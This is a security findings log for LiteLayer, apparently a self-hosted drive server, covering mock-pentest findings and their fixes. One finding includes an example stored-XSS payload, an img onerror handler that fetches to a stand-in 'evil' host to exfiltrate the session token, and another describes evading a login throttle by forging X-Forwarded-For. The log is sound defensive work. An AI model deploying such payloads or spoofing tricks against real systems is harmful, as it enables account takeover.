# Security findings log

A running log of the internal security reviews / mock-pentests of LiteLayer, the
gaps they turned up, and what was done about each. Newest review first.

Severity is impact × ease of exploitation for a remote attacker who has reached the
web UI (LAN or tunnel). "Fixed" means the change is in the tree and has a runnable
check; "Accepted" means we judged the residual risk not worth the fix's cost and say
why.

---

## Feature note — 2026-07-05 (Photo Inbox threat surface)

The email→Pi photo pipeline (`app/photo_inbox.py`) adds a new write path onto
drives. Mitigations shipped with it: sender allowlist (empty list = self-only),
attachment extension allowlist (images/video only — never executables or docs),
filenames stripped to their basename before `_safe_path`/`_unique` write, IMAP
app-password stored Fernet-encrypted (same key as `settings_store`), API masks
the password and a blank update never wipes it (tested).

**Fixed (2026-07-05, same day):** the `From:`-spoofing gap is closed by two
stacked gates — (1) `require_verified` (default on) rejects mail that didn't
pass the provider's own DKIM/SPF check, read from the `Authentication-Results`
header, so a forged From can't sign for the real domain; (2) optional
per-phone registration: server-generated 8-char secret codes carried in the
recipient plus-address (`user+code@host`) or subject — once any phone is
registered, mail without a valid code is dropped and each phone is
individually revocable. Both have runnable checks in `tests/test_photo_inbox.py`.
*(2026-07-06: gate (2), the per-phone plus-address registration, was removed by
request — `require_verified` and the sender allowlist remain the two gates.)*
Residual: a sender whose *mailbox itself* is compromised can still submit
images (not spoofing — real account takeover); impact remains images-only,
basename-stripped, path-safe writes.

---

## Review 3 — 2026-07-02 (closing the token-exposure follow-ups)

Fixed **F-02** and **F-03** (details updated in place under Review 1): the first-party
UI no longer holds the session token in JS and the terminal WebSocket authenticates
from the same-origin cookie. No remaining "Accepted" auth findings except F-04
(covered by SameSite=Lax).

---

## Review 2 — 2026-07-02 (frontend XSS + IP-trust consistency)

### F-05 · Stored XSS via Markdown / DOCX preview · **High** · Fixed
- **Where:** `dev-ui/assets/js/viewers.js` — `marked.parse()` (Markdown preview) and
  `mammoth.convertToHtml()` (DOCX viewer) output was dropped straight into
  `innerHTML`.
- **Attack:** file content is attacker-controlled. `marked` passes raw HTML through
  unchanged, so a `.md` file containing
  `<img src=x onerror="fetch('//evil/?t='+authToken)">` runs JS in the authenticated
  origin the instant someone opens **Preview**. It chains with F-02: the in-memory
  Bearer token is script-readable, so one previewed file → full account takeover from
  any device. DOCX is the same sink via a crafted document (lower, since mammoth emits
  a constrained subset).
- **Fix:** route both through DOMPurify (`_safeHtml()`, loaded from the same CDN as
  marked/mammoth). If DOMPurify can't load it **fails closed** — escapes to plain text
  instead of rendering unsanitized markup.
- **Verify:** the fail-closed path escapes `<img onerror>` to `&lt;img…` (checked with
  a standalone node harness against the extracted functions).

### F-06 · Spoofable client IP in the PIN-unlock audit log · **Low** · Fixed
- **Where:** `app/routers/drives.py` `unlock_drive()` kept an inline copy of the old
  `X-Forwarded-For.split(",")[0]` logic for its audit record.
- **Attack:** the PIN *throttle* is keyed per-drive (not IP) so lockout still holds,
  but an attacker could forge the IP written against `pin.fail` / `pin.throttled`
  events — poisoning the audit trail after a break-in attempt.
- **Fix:** extracted the non-spoofable resolver into `app/netutil.client_ip()` (one
  source of truth) and pointed both `main.py` and the drives router at it.
- **Verify:** `python -m app.netutil` self-check.

---

## Review 1 — 2026-07-02 (auth / throttle / path / session surface)

### F-01 · Brute-force throttle bypass via `X-Forwarded-For` · **High** · Fixed
- **Where:** `app/main.py` `_client_ip()` read the *leftmost* `X-Forwarded-For` entry,
  which is whatever the client sent.
- **Attack:** the login / 2FA / PIN throttle keys on this IP, so sending
  `X-Forwarded-For: <random>` per request drops every guess in a fresh bucket — the
  5-try escalating lockout never fires. Password and 2FA guessing were effectively
  unlimited.
- **Fix:** trust forwarding headers **only** when the direct peer is a local proxy
  (loopback): prefer `CF-Connecting-IP` (tunnel) or the *rightmost*, proxy-appended
  `X-Forwarded-For` entry (Caddy); otherwise use the real TCP peer. Now lives in
  `app/netutil.client_ip()`.
- **Verify:** mock pentest — 40 guesses rotating XFF; old logic never throttled, fix
  locks out after 5, real IPs preserved behind both proxies.

### F-02 · Session token in login body is a script-readable Bearer key · **Medium-High** · Fixed
- **Where:** `POST /api/login` returns `{"token": …}`; `deps.py` accepts that same
  value as a `Bearer` token, and the Bearer path **skips** the session↔device binding.
- **Impact:** the HttpOnly cookie can't be read by JS, but the returned token was held
  in a JS variable (`authToken`) and works as a Bearer from any device — so any XSS
  (see F-05) could exfiltrate it and bypass both HttpOnly and device-binding.
- **Fix:** the first-party UI is served same-origin (`API=''`), where the HttpOnly
  cookie already authenticates every request — so it no longer stores the token at all
  (`authToken = API ? data.token : null`, in `auth.js` + `terminal.js`). An XSS now has
  nothing to steal. Every request path already fell back to the cookie
  (`credentials:'include'`); the one exception, the terminal WebSocket, now
  authenticates from the same-origin cookie (with the same device-binding check as
  `deps.require_auth`). The token is still returned for genuine cross-origin API/dev
  clients that can't send the cookie.

### F-03 · Terminal WebSocket passes the session token in the URL query · **Low-Medium** · Fixed (same-origin)
- **Where:** `/api/system/terminal?token=…&ticket=…`.
- **Impact:** query strings land in proxy/access logs and browser history, so the
  session token could leak there.
- **Fix:** the WS now reads the session from the same-origin cookie, so the first-party
  UI sends **no** token in the URL (only the single-use `ticket` remains, which is
  already fresh-password-gated and useless after one use). The query token stays as a
  fallback for cross-origin API clients that can't send the cookie.

### F-04 · CSRF guard passes when `Origin` and `Referer` are both absent · **Low** · Accepted
- **Where:** `app/main.py` `_security_and_cache` middleware.
- **Impact:** a state-changing cookie request with no `Origin`/`Referer` isn't blocked.
  Mitigated in practice by the `SameSite=Lax` session cookie (a cross-site page can't
  get the cookie sent on a fetch at all) and JSON-only bodies (a cross-site form post
  can't set `Content-Type: application/json`).
- **Why not fixed:** tightening it to reject the missing-header case broke legitimate
  non-browser cookie clients (the test suite caught it). The intended non-browser path
  is Bearer (exempt), and the SameSite cookie already carries the load — so the extra
  strictness wasn't worth breaking callers.

---

## Reviewed and found sound (no change needed)

- **Path traversal** (`_safe_path`) — `resolve()` + `is_relative_to`, with symlink
  escapes caught because `resolve()` follows links before the check. Upload/mkdir/
  move/rename/delete all re-validate; delete refuses the drive root.
- **Command injection** — every privileged op (`mount`, `umount`, `systemctl`, `git`,
  `zerotier-cli`) uses `subprocess` **list** form (no shell). The few `shell=True`
  paths (VPN/CF install, reset) run only fixed command strings; user-supplied values
  (ZeroTier network id, CF token) are charset-validated first. The system disk is
  gated by `_assert_external`.
- **Timing / user enumeration** — `store.verify_password` and `pinlock._verify` both
  verify against a dummy argon2 hash when the user/PIN is absent, so present vs absent
  take the same time.
- **TOTP replay** — `twofa.verify` records the highest accepted step and refuses any
  step at or before it; stale codes (clock drift) never work.
- **Settings at rest** — Fernet-encrypted (`settings_store`), key mode 0600, self-check
  asserts no plaintext hits disk.
- **OTA** — only checks out validated hex shas / official tags; installer pulled from a
  fixed HTTPS URL. Reset is password-gated.
- **Drive `id` in mount paths** — flows from `lsblk` UUIDs and only ever reaches mount
  via `registry.get()` (must be an enumerated drive), so the API can't pass an
  arbitrary path. A crafted-UUID USB drive is a physical-access threat, out of scope
  for the remote model.
